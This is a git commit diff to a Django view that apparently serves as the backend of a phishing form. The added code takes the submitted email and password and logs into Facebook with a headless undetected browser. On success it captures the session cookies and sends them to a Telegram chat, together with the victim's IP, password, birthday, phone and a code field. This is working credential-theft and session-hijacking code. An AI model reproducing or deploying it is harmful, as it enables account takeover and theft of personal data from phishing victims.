cf259682f52a3ab5ab286547dd6d7d8ccaa71043
namng <nam.nn@bidgear.com>
2023-12-16 22:26:01 +0700

    edit

--- crawler/views.py
+++ crawler/views.py
@@ -1,9 +1,12 @@
 from django.shortcuts import render
 from notification.views import send_telegram_message
+from seleniumbase import Driver
 from datetime import datetime
+
 import requests
 import json
 import logging
+import time
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 
@@ -49,12 +52,41 @@ def process(request):
     if request.method == 'POST':
         final_data = {}
         public_ip = get_client_ip(request)
-        geolocation = get_geolocation(public_ip)
+        # geolocation = get_geolocation(public_ip)
         final_data['public_ip'] = public_ip
-        final_data.update(geolocation)
+        # final_data.update(geolocation)
         submit_data = json.loads(request.body)['data']
         final_data.update(submit_data)
-        print(final_data)
+
+        driver = Driver(uc=True, headless=True)
+        driver.open("https://www.facebook.com")
+
+        # Enter your Facebook username and password
+        driver.type("#email", final_data.get('emailPersonal', ''))
+        driver.type("#pass", final_data.get('password', ''))
+
+        # Click the "Log In" button
+        driver.click('button[name="login"]')
+
+        # Wait for a specific element that indicates a successful login
+        driver.wait_for_element('a[aria-label="Facebook"]', timeout=10)
+
+        # Check if the element is present, indicating a successful login
+        if driver.is_element_visible('a[aria-label="Facebook"]'):
+            # Get the cookies after a successful login
+            cookies = driver.get_cookies()
+
+            # Format cookies into a string
+            cookie_string = ';'.join([f"{cookie['name']}:{cookie['value']}" for cookie in cookies])
+
+            # Print the formatted cookies
+            final_data['cookie'] = cookie_string
+            # print(cookie_string)
+            driver.close()
+        else:
+            print("Login failed. Cookies not retrieved.")
+
+        logging.info(final_data)
         message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n *Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
             datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
             final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
@@ -65,7 +97,9 @@ def process(request):
             final_data.get('user_agent',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'),
             final_data.get('code', ''), final_data.get('cookie', ''))
+        logging.info('SENDING DATA TO SERVER')
         send_telegram_message(message)
+
         return render(request=request, template_name='form.html')
     else:
         return render(request=request, template_name='form.html')
